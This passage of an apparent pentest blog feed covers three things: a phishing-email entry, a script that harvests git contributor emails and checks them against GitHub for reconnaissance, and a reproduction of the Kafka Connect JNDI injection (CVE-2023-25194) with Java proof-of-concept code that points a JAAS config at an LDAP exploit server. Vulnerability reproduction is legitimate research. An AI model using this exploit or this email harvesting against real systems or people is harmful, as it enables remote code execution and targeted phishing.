&lt;h3 id=&quot;使用SendCloud&quot;&gt;&lt;a href=&quot;#使用SendCloud&quot; class=&quot;headerlink&quot; title=&quot;使用SendCloud&quot;&gt;&lt;/a&gt;使用SendCloud&lt;/h3&gt;&lt;p&gt;注册SendCloud之后，生成API Key，利用以下代码发送钓鱼邮件：&lt;/p&gt;</summary>
    
    
    
    <category term="Pentest" scheme="https://jkme.github.io/categories/Pentest/"/>
    
    
  </entry>
  
  <entry>
    <title>Github搜索小技巧</title>
    <link href="https://jkme.github.io/2023/03/03/github-trick.html"/>
    <id>https://jkme.github.io/2023/03/03/github-trick.html</id>
    <published>2023-03-02T16:00:00.000Z</published>
    <updated>2023-03-29T02:10:26.824Z</updated>
    
    <content type="html"><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>获取了一个多人运动的git仓库，需要提取仓库里面所有的Email，然后根据Email搜一下Github是否存在对应的提交记录。这是一个很常见的问题，比如公司员工在提交gihtub的时候，没有注意修改提交的邮箱，很可能使用公司的邮箱进行提交。</p><h2 id="解决方式"><a href="#解决方式" class="headerlink" title="解决方式"></a>解决方式</h2><p>有两种方法可以提取一个仓库的所有邮箱：</p><h3 id="第一种"><a href="#第一种" class="headerlink" title="第一种"></a>第一种</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> log <span class="token string">"--format=format:%ae"</span> <span class="token operator">|</span> <span class="token function">sort</span> <span class="token operator">|</span> <span class="token function">uniq</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="第二种"><a href="#第二种" class="headerlink" title="第二种"></a>第二种</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> shortlog -sea <span class="token operator">|</span> <span class="token function">grep</span> -E -o <span class="token string">"<span class="token entity" title="\b">\b</span>[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]&#123;2,6&#125;<span class="token entity" title="\b">\b</span>"</span> <span class="token operator">|</span> <span class="token function">awk</span> <span class="token string">'&#123;print tolower($0)&#125;'</span> <span class="token operator">|</span> <span class="token function">sort</span> <span class="token operator">|</span> <span class="token function">uniq</span> <span class="token operator">|</span> <span class="token function">grep</span> -wv <span class="token string">'users.noreply.github.com'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后根据<a href="https://mp.weixin.qq.com/s/zoYE102P_2BvB-sForjkHQ">github小技巧</a>写一个批量获取邮箱的脚本：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># coding: utf-8</span><span class="token keyword">import</span> requests<span class="token keyword">import</span> json<span class="token keyword">from</span> random <span class="token keyword">import</span> choice<span class="token keyword">import</span> sys<span class="token keyword">import</span> timeTOKEN_LISTS <span class="token operator">=</span> <span class="token punctuation">[</span>      <span class="token string">""</span><span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">search_commits</span><span class="token punctuation">(</span>token<span class="token punctuation">,</span> email<span class="token punctuation">)</span><span class="token punctuation">:</span>       headers <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"Accept"</span><span class="token punctuation">:</span> <span class="token string">"application/vnd.github+json"</span><span class="token punctuation">,</span>                   <span class="token string">"Authorization"</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"Bearer </span><span class="token interpolation"><span class="token punctuation">&#123;</span>token<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>                  <span class="token punctuation">&#125;</span>       req <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'http://api.github.com/search/commits'</span><span class="token punctuation">,</span>           <span class="token punctuation">&#123;</span><span class="token string">'q'</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"committer-email:</span><span class="token interpolation"><span class="token punctuation">&#123;</span>email<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>           headers<span class="token operator">=</span>headers<span class="token punctuation">)</span>       <span class="token keyword">return</span> json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>req<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    <span class="token comment"># file = sys.argv[1]</span>    <span class="token builtin">file</span> <span class="token operator">=</span> <span class="token string">"/tmp/email.txt"</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>          <span class="token keyword">for</span> line <span class="token keyword">in</span> f<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                email <span class="token operator">=</span> line<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>                token <span class="token operator">=</span> choice<span class="token punctuation">(</span>TOKEN_LISTS<span class="token punctuation">)</span>                                <span class="token keyword">try</span><span class="token punctuation">:</span>                    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>                    <span class="token keyword">if</span> search_commits<span class="token punctuation">(</span>token<span class="token punctuation">,</span> email<span class="token punctuation">)</span><span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"total_count"</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">:</span>                        <span class="token keyword">print</span><span class="token punctuation">(</span>email<span class="token punctuation">)</span>                <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>                     <span class="token keyword">raise</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li><a href="https://nelson.cloud/scrape-contributor-emails-from-any-git-repository/">Scrape Contributor Emails From Any Git Repository</a></li><li><a href="https://mp.weixin.qq.com/s/zoYE102P_2BvB-sForjkHQ">github小技巧</a></li><li><a href="https://www.securitronlinux.com/debian-testing/how-to-get-a-listing-of-all-email-addresses-associated-with-a-github-repo/">How To Get A Listing Of All Email Addresses Associated With A Github Repo.</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;背景&quot;&gt;&lt;a href=&quot;#背景&quot; class=&quot;headerlink&quot; title=&quot;背景&quot;&gt;&lt;/a&gt;背景&lt;/h2&gt;&lt;p&gt;获取了一个多人运动的git仓库，需要提取仓库里面所有的Email，然后根据Email搜一下Github是否存在对应的提交记录。这是一个很常见的问题，比如公司员工在提交gihtub的时候，没有注意修改提交的邮箱，很可能使用公司的邮箱进行提交。&lt;/p&gt;
&lt;h2 id=&quot;解决方式&quot;&gt;&lt;a href=&quot;#解决方式&quot; class=&quot;headerlink&quot; title=&quot;解决方式&quot;&gt;&lt;/a&gt;解决方式&lt;/h2&gt;&lt;p&gt;有两种方法可以提取一个仓库的所有邮箱：&lt;/p&gt;
&lt;h3 id=&quot;第一种&quot;&gt;&lt;a href=&quot;#第一种&quot; class=&quot;headerlink&quot; title=&quot;第一种&quot;&gt;&lt;/a&gt;第一种&lt;/h3&gt;&lt;pre class=&quot;line-numbers language-bash&quot; data-language=&quot;bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;span class=&quot;token function&quot;&gt;git&lt;/span&gt; log &lt;span class=&quot;token string&quot;&gt;&quot;--format=format:%ae&quot;&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;sort&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;uniq&lt;/span&gt;&lt;span aria-hidden=&quot;true&quot; class=&quot;line-numbers-rows&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&quot;第二种&quot;&gt;&lt;a href=&quot;#第二种&quot; class=&quot;headerlink&quot; title=&quot;第二种&quot;&gt;&lt;/a&gt;第二种&lt;/h3&gt;&lt;pre class=&quot;line-numbers language-bash&quot; data-language=&quot;bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;span class=&quot;token function&quot;&gt;git&lt;/span&gt; shortlog -sea &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;grep&lt;/span&gt; -E -o &lt;span class=&quot;token string&quot;&gt;&quot;&lt;span class=&quot;token entity&quot; title=&quot;\b&quot;&gt;\b&lt;/span&gt;[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]&amp;#123;2,6&amp;#125;&lt;span class=&quot;token entity&quot; title=&quot;\b&quot;&gt;\b&lt;/span&gt;&quot;&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;awk&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&#39;&amp;#123;print tolower($0)&amp;#125;&#39;&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;sort&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;uniq&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;grep&lt;/span&gt; -wv &lt;span class=&quot;token string&quot;&gt;&#39;users.noreply.github.com&#39;&lt;/span&gt;&lt;span aria-hidden=&quot;true&quot; class=&quot;line-numbers-rows&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;然后根据&lt;a href=&quot;https://mp.weixin.qq.com/s/zoYE102P_2BvB-sForjkHQ&quot;&gt;github小技巧&lt;/a&gt;写一个批量获取邮箱的脚本：&lt;/p&gt;
&lt;pre class=&quot;line-numbers language-python&quot; data-language=&quot;python&quot;&gt;&lt;code class=&quot;language-python&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;# coding: utf-8&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; requests
&lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; json
&lt;span class=&quot;token keyword&quot;&gt;from&lt;/span&gt; random &lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; choice
&lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; sys
&lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; time

TOKEN_LISTS &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;
      &lt;span class=&quot;token string&quot;&gt;&quot;&quot;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;

&lt;span class=&quot;token keyword&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;search_commits&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;token&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; email&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
       headers &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;&amp;#123;&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;Accept&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;application/vnd.github+json&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
                   &lt;span class=&quot;token string&quot;&gt;&quot;Authorization&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string-interpolation&quot;&gt;&lt;span class=&quot;token string&quot;&gt;f&quot;Bearer &lt;/span&gt;&lt;span class=&quot;token interpolation&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;#123;&lt;/span&gt;token&lt;span class=&quot;token punctuation&quot;&gt;&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;
                  &lt;span class=&quot;token punctuation&quot;&gt;&amp;#125;&lt;/span&gt;
       req &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; requests&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;get&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&#39;http://api.github.com/search/commits&#39;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
           &lt;span class=&quot;token punctuation&quot;&gt;&amp;#123;&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&#39;q&#39;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string-interpolation&quot;&gt;&lt;span class=&quot;token string&quot;&gt;f&quot;committer-email:&lt;/span&gt;&lt;span class=&quot;token interpolation&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;#123;&lt;/span&gt;email&lt;span class=&quot;token punctuation&quot;&gt;&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
           headers&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;headers&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
       &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; json&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;loads&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;req&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;text&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; __name__ &lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;__main__&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;token comment&quot;&gt;# file = sys.argv[1]&lt;/span&gt;
    &lt;span class=&quot;token builtin&quot;&gt;file&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;/tmp/email.txt&quot;&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;with&lt;/span&gt; &lt;span class=&quot;token builtin&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token builtin&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;r&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;as&lt;/span&gt; f&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
          &lt;span class=&quot;token keyword&quot;&gt;for&lt;/span&gt; line &lt;span class=&quot;token keyword&quot;&gt;in&lt;/span&gt; f&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;readlines&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
                email &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; line&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;strip&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
                token &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; choice&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;TOKEN_LISTS&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
                
                &lt;span class=&quot;token keyword&quot;&gt;try&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
                    time&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;sleep&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
                    &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; search_commits&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;token&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; email&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;get&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;total_count&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
                        &lt;span class=&quot;token keyword&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;email&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
                &lt;span class=&quot;token keyword&quot;&gt;except&lt;/span&gt; Exception &lt;span class=&quot;token keyword&quot;&gt;as&lt;/span&gt; e&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
                     &lt;span class=&quot;token keyword&quot;&gt;raise&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;e&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
&lt;span aria-hidden=&quot;true&quot; class=&quot;line-numbers-rows&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;</summary>
    
    
    
    <category term="Pentest" scheme="https://jkme.github.io/categories/Pentest/"/>
    
    
  </entry>
  
  <entry>
    <title>Apache Kafka Connect JNDI注入漏洞复现(CVE-2023-25194)</title>
    <link href="https://jkme.github.io/2023/02/14/kafka-rce.html"/>
    <id>https://jkme.github.io/2023/02/14/kafka-rce.html</id>
    <published>2023-02-13T16:00:00.000Z</published>
    <updated>2023-02-22T08:44:47.705Z</updated>
    
    <content type="html"><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><ul><li>影响版本：2.3.0 &lt;= Apache Kafka Connect &lt;= 3.3.2</li><li>修复建议: 升级至3.4.0版本</li><li>官方链接：<a href="https://kafka.apache.org/cve-list">https://kafka.apache.org/cve-list</a></li></ul><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>本地先启动kafka server:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">wget</span> https://dlcdn.apache.org/kafka/3.4.0/kafka_2.13-3.4.0.tgz<span class="token function">tar</span> -xvf kafka_2.13-3.4.0.tgz //启动zk和kafkabin/zookeeper-server-start.sh config/zookeeper.propertiesbin/kafka-server-start.sh config/server.properties //创建一个测试topicbin/kafka-topics.sh --create --bootstrap-server localhost:9092 --replication-factor <span class="token number">1</span> --partitions <span class="token number">1</span> --topic <span class="token builtin class-name">test</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="测试代码"><a href="#测试代码" class="headerlink" title="测试代码"></a>测试代码</h3><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>kafka<span class="token punctuation">.</span>clients<span class="token punctuation">.</span>producer<span class="token punctuation">.</span></span><span class="token class-name">KafkaProducer</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>kafka<span class="token punctuation">.</span>clients<span class="token punctuation">.</span>producer<span class="token punctuation">.</span></span><span class="token class-name">Producer</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>kafka<span class="token punctuation">.</span>clients<span class="token punctuation">.</span>producer<span class="token punctuation">.</span></span><span class="token class-name">ProducerRecord</span><span class="token punctuation">;</span> <span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Properties</span><span class="token punctuation">;</span> <span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Main</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Properties</span> props <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Properties</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        props<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"sasl.mechanism"</span><span class="token punctuation">,</span> <span class="token string">"SCRAM-SHA-256"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        props<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"security.protocol"</span><span class="token punctuation">,</span> <span class="token string">"SASL_SSL"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        props<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"sasl.jaas.config"</span><span class="token punctuation">,</span><span class="token string">"com.sun.security.auth.module.JndiLoginModule "</span>                    <span class="token operator">+</span> <span class="token string">"required user.provider.url=\"ldap://0.0.0.0:1389/Exploit\" "</span>                    <span class="token operator">+</span> <span class="token string">"useFirstPass=\"true\" serviceName=\"x\" debug=\"true\" "</span>                    <span class="token operator">+</span> <span class="token string">"group.provider.url=\"xxx\";"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        props<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"bootstrap.servers"</span><span class="token punctuation">,</span> <span class="token string">"0.0.0.0:9092"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        props<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"key.deserializer"</span><span class="token punctuation">,</span> <span class="token string">"org.apache.kafka.common.serialization.StringDeserializer"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        props<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"value.deserializer"</span><span class="token punctuation">,</span> <span class="token string">"org.apache.kafka.common.serialization.StringDeserializer"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        props<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"key.serializer"</span><span class="token punctuation">,</span> <span class="token string">"org.apache.kafka.common.serialization.StringSerializer"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        props<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"value.serializer"</span><span class="token punctuation">,</span> <span class="token string">"org.apache.kafka.common.serialization.StringSerializer"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-></span> <span class="token punctuation">&#123;</span>            <span class="token class-name">Producer</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">></span></span> producer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">KafkaProducer</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span>props<span class="token punctuation">)</span><span class="token punctuation">;</span>            producer<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ProducerRecord</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token string">"test"</span><span class="token punctuation">,</span> <span class="token string">"hello"</span><span class="token punctuation">,</span> <span class="token string">"world"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            producer<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>pom.xml文件：</p><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependencies</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.apache.kafka<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>kafka-clients<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>3.3.0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>commons-beanutils<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>commons-beanutils<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>1.8.3<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependencies</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="生成反序列化数据"><a href="#生成反序列化数据" class="headerlink" 